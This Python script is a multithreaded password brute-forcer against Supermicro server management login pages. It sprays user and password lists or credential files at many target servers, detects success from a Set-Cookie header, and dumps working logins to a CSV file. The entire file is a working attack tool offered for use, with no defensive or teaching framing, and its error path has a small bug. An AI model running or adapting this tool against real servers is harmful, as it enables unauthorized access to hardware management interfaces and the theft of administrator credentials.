#! /usr/bin/env python3

import requests
from base64 import b64encode
from datetime import date
from urllib.parse import quote
from optparse import OptionParser
from colorama import Fore, Back, Style
from multiprocessing import Lock, Pool, cpu_count
from time import strftime, localtime, time

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

scheme = "http"
login_endpoint = "/cgi/login.cgi"
lock = Lock()
thread_count = cpu_count()

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

def login(server, username='ADMIN', password='ADMIN', scheme="http"):
    t1 = time()
    try:
        response = requests.post(f"{scheme}://{server}{login_endpoint}", data=f"name={quote(b64encode(username.encode()).decode())}&pwd={quote(b64encode(password.encode()).decode())}&check=00", verify=False)
        authorization_status = True if "Set-Cookie" in response.headers.keys() else False
        t2 = time()
        return authorization_status, t2-t1
    except Exception as error:
        return error, t2-t1
def brute_force(thread_index, servers, credentials, scheme="http"):
    successful_logins = {}
    for credential in credentials:
        status = ['']
        for server in servers:
            status = login(server, credential[0], credential[1], scheme)
            if status[0] == True:
                successful_logins[server] = [credential[0], credential[1]]
                with lock:
                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
            elif status[0] == False:
                with lock:
                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
            else:
                with lock:
                    display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
    return successful_logins
def main(servers, credentials, scheme="http"):
    successful_logins = {}
    pool = Pool(thread_count)
    display('+', f"Starting {Back.MAGENTA}{thread_count} Brute Force Threads{Back.RESET}")
    display(':', f"Credentials / Threads = {Back.MAGENTA}{len(credentials)//thread_count}{Back.RESET}")
    threads = []
    total_servers = len(servers)
    server_divisions = [servers[group*total_servers//thread_count: (group+1)*total_servers//thread_count] for group in range(thread_count)]
    for index, server_division in enumerate(server_divisions):
        threads.append(pool.apply_async(brute_force, (index, server_division, credentials, scheme)))
    for thread in threads:
        successful_logins.update(thread.get())
    pool.close()
    pool.join()
    display('+', f"Threads Finished Excuting")
    return successful_logins

if __name__ == "__main__":
    arguments = get_arguments(('-s', "--server", "server", "Target Supermicro Server (seperated by ',' or File Name)"),
                              ('-u', "--users", "users", "Target Users (seperated by ',') or File containing List of Users"),
                              ('-P', "--password", "password", "Passwords (seperated by ',') or File containing List of Passwords"),
                              ('-c', "--credentials", "credentials", "Name of File containing Credentials in format ({user}:{password})"),
                              ('-S', "--scheme", "scheme", f"Scheme to use (Default={scheme})"),
                              ('-w', "--write", "write", "CSV File to Dump Successful Logins (default=current data and time)"))
    if not arguments.server:
        display('-', f"Please specify {Back.YELLOW}Target Servers{Back.RESET}")
        exit(0)
    else:
        try:
            with open(arguments.server, 'r') as file:
                arguments.server = [server for server in file.read().split('\n') if server != '']
        except FileNotFoundError:
            arguments.server = arguments.server.split(',')
        except Exception as error:
            display('-', f"Error Occured while reading File {Back.MAGENTA}{arguments.server}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    if not arguments.credentials:
        if not arguments.users:
            display('*', f"No {Back.MAGENTA}USER{Back.RESET} Specified")
            arguments.users = ['']
            arguments.password = ['']
        else:
            try:
                with open(arguments.users, 'r') as file:
                    arguments.users = [user for user in file.read().split('\n') if user != '']
            except FileNotFoundError:
                arguments.users = arguments.users.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.users}{Back.RESET}")
                exit(0)
            display(':', f"Users Loaded = {Back.MAGENTA}{len(arguments.users)}{Back.RESET}")
        if not arguments.password:
            display('-', f"Please specify {Back.YELLOW}Passwords{Back.RESET}")
            exit(0)
        elif arguments.password != ['']:
            try:
                with open(arguments.password, 'r') as file:
                    arguments.password = [password for password in file.read().split('\n') if password != '']
            except FileNotFoundError:
                arguments.password = arguments.password.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.password}{Back.RESET}")
                exit(0)
            display(':', f"Passwords Loaded = {Back.MAGENTA}{len(arguments.password)}{Back.RESET}")
        arguments.credentials = []
        for user in arguments.users:
            for password in arguments.password:
                arguments.credentials.append([user, password])
    else:
        try:
            with open(arguments.credentials, 'r') as file:
                arguments.credentials = [[credential.split(':')[0], ':'.join(credential.split(':')[1:])] for credential in file.read().split('\n') if len(credential.split(':')) > 1]
        except:
            display('-', f"Error while Reading File {Back.YELLOW}{arguments.credentials}{Back.RESET}")
            exit(0)
    arguments.scheme = arguments.scheme if arguments.scheme else scheme
    if not arguments.write:
        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
    display('+', f"Total Servers     = {Back.MAGENTA}{len(arguments.server)}{Back.RESET}")
    display('+', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
    t1 = time()
    successful_logins = main(arguments.server, arguments.credentials, arguments.scheme)
    t2 = time()
    display(':', f"Successful Logins = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
    display(':', f"Time Taken        = {Back.MAGENTA}{t2-t1:.2f} seconds{Back.RESET}")
    display(':', f"Rate              = {Back.MAGENTA}{len(arguments.credentials)/(t2-t1):.2f} logins / seconds{Back.RESET}")
    display(':', f"Dumping Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
    with open(arguments.write, 'w') as file:
        file.write(f"Server,User,Password\n")
        file.write('\n'.join([f"{server},{user},{password}" for server, (user, password) in successful_logins.items()]))
    display('+', f"Dumped Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}") 